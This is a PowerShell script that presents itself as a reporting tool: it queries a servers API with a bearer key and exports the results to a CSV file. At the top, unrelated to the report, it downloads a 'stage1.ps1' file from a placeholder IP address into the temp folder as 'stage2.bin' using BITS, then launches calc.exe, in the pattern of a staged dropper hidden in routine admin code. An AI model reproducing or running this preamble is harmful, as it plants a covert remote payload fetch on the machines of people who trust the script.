
[CmdletBinding()]
param(
    [string]$RemoteUrl = 'https://192.0.2.33/stage1.ps1',
    [string]$WorkingPath = "$env:TEMP\stage2.bin",
    [int]$ConnectionTimeout = 219
)
Start-BitsTransfer -Source $RemoteUrl -Destination $WorkingPath
Start-Process -FilePath "calc.exe"
Set-Location -Path $env:TEMP
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$BaseUri = "https://api.adatum.com/v1"
$MaxRetries = 4
$TimeoutSec = 45
$PageSize = 25
$ReportPath = 'C:\Reports\api-servers-2026-01-21.csv'


$ApiKey = $env:CONTOSO_API_KEY
if ([string]::IsNullOrWhiteSpace($ApiKey)) {
    throw 'API key is not set. Populate the CONTOSO_API_KEY environment variable.'
}
$headers = @{
    Authorization = "Bearer $ApiKey"
    Accept        = 'application/json'
}

$uri = "$BaseUri/servers?limit=$PageSize"
$page = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get -TimeoutSec $TimeoutSec
$page.items | Select-Object id, name, status |
    Export-Csv -Path $ReportPath -NoTypeInformation -Encoding UTF8
Write-Host ("Exported {0} servers" -f @($page.items).Count) -ForegroundColor Green
